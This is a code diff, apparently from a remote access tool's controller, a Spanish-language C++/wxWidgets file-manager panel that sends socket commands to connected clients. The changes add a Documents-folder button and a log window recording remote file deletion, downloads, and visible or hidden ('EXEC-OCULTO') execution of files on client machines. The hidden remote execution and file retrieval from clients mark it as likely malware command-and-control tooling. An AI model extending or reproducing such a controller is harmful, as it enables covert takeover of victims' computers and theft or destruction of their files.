@@ -148,7 +148,7 @@ panelFileManager::panelFileManager(wxWindow* pParent, SOCKET sck, std::string _s
 	left_toolbar->AddSeparator();
 	left_toolbar->AddTool(EnumIDS::ID_Panel_FM_Descargas, wxT("Descargas"), downloadBitmap, "Descargas");
 	left_toolbar->AddSeparator();
-	left_toolbar->AddTool(EnumIDS::ID_Panel_FM_Refresh, wxT("Documentos"), documentsBitmap, wxT("Documentos"));
+	left_toolbar->AddTool(EnumIDS::ID_Panel_FM_Documentos, wxT("Documentos"), documentsBitmap, wxT("Documentos"));
 	left_toolbar->Realize();
 
 	wxBoxSizer* left_sizer = new wxBoxSizer(wxVERTICAL);
@@ -164,7 +164,7 @@ panelFileManager::panelFileManager(wxWindow* pParent, SOCKET sck, std::string _s
 	wxPanel* pnl_Down = new wxPanel(this);
 	this->CrearLista(pnl_Down);
 	//this->listManager->SetParent(pnl_Down);
-	wxTextCtrl* txt_Log = new wxTextCtrl(pnl_Down, wxID_ANY, "", wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE | wxHSCROLL | wxTE_READONLY);
+	this->txt_Log = new wxTextCtrl(pnl_Down, wxID_ANY, "", wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE | wxHSCROLL | wxTE_READONLY);
 
 	wxBoxSizer* down_sizer = new wxBoxSizer(wxVERTICAL);
 
@@ -230,6 +230,17 @@ void panelFileManager::OnToolBarClick(wxCommandEvent& event) {
 			this->listManager->DeleteAllItems();
 			this->iMODE = FM_NORMAL;
 			strComando = "ESCRI-DESK";
+
+			this->listManager->Enable(false);
+			this->listManager->MostrarCarga();
+
+			this->EnviarComando(strComando, EnumComandos::FM_Dir_Folder);
+			break;
+		case EnumIDS::ID_Panel_FM_Documentos:
+			//ENVIAR COMANDO OBTENER FOLDER DE DOCUMENTOS
+			this->listManager->DeleteAllItems();
+			this->iMODE = FM_NORMAL;
+			strComando = "DOCU";
 
 			this->listManager->Enable(false);
 			this->listManager->MostrarCarga();
@@ -457,6 +468,7 @@ void ListCtrlManager::OnBorrarArchivo(wxCommandEvent& event) {
 		std::string strComando = this->CarpetaActual();
 		strComando += strFile;
 		this->itemp->EnviarComando(strComando, EnumComandos::FM_Borrar_Archivo);
+		this->itemp->txt_Log->AppendText("[BORRANDO] " + strComando + "\n");
 	}
 }
 
@@ -499,6 +511,7 @@ void ListCtrlManager::OnDescargarArchivo(wxCommandEvent& event) {
 	p_Servidor->vc_Clientes[iClienteID]->Transfers_Insertar(strID, nuevo_archivo, nuevo_transfer);
 
 	this->itemp->EnviarComando(strComando, EnumComandos::FM_Descargar_Archivo);
+	this->itemp->txt_Log->AppendText("[DESCARGANDO] " + this->ArchivoSeleccionado() + "\n");
 }
 
 void ListCtrlManager::OnEjecutarArchivo_Visible(wxCommandEvent& event) {
@@ -506,6 +519,7 @@ void ListCtrlManager::OnEjecutarArchivo_Visible(wxCommandEvent& event) {
 	strComando.append(1, CMD_DEL);
 	strComando.append(1, EXEC_VISIBLE);
 	this->itemp->EnviarComando(strComando, EnumComandos::FM_Ejecutar_Archivo);
+	this->itemp->txt_Log->AppendText("[EXEC-VISIBLE] " + strComando + "\n");
 }
 
 void ListCtrlManager::OnEjecutarArchivo_Oculto(wxCommandEvent& event) {
@@ -513,6 +527,7 @@ void ListCtrlManager::OnEjecutarArchivo_Oculto(wxCommandEvent& event) {
 	strComando.append(1, CMD_DEL);
 	strComando.append(1, EXEC_OCULTO);
 	this->itemp->EnviarComando(strComando, EnumComandos::FM_Ejecutar_Archivo);
+	this->itemp->txt_Log->AppendText("[EXEC-OCULTO] " + strComando + "\n");
 }
 
 void ListCtrlManager::OnEditarArchivo(wxCommandEvent& event) {
